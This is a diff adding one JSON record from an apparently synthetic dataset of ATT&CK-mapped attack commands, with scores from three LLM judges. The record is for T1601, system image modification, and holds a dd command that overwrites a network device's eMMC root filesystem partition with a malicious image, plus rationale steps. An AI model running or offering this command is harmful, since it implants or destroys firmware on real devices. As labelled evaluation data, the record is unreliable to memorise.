@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: overwrite eMMC rootfs partition'; dd if=/tmp/mal_rootfs.img of=/dev/mmcblk0p2 bs=4M conv=fsync && sync",
+  "explanation": "Writes a malicious rootfs image directly to an eMMC partition commonly used on modern switches/routers, modifying the bootable system image.",
+  "rationale_steps": [
+    "Target the correct eMMC partition holding the root filesystem.",
+    "Use dd with large blocks and fsync to ensure reliable on-disk writes.",
+    "Commit changes to persist across device reboots."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-21a9400f",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper echo statement, command separator (;), valid dd syntax with appropriate parameters (if, of, bs, conv), and proper command chaining (&&) with sync.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1601 by directly overwriting the rootfs partition on an eMMC storage device with a malicious image, which effectively modifies the system image as described in the technique.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T19:26:11.386658Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid commands, arguments, and command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command uses `dd` to directly overwrite a bootable eMMC rootfs partition, which is a highly effective and direct method to modify a system image as described by T1601, despite requiring elevated privileges for execution.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T19:26:38.008389Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting with proper ';' and '&&' separators and standard dd flags make the command well-formed and parseable.",
+        "semantic_score": 3,
+        "semantic_justification": "Using dd to write a rootfs image to an eMMC partition aligns with T1601, but it requires elevated privileges and accurate device targeting, so with 'Privilege: None' it would typically fail to achieve the intended modification.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T19:26:41.078257Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
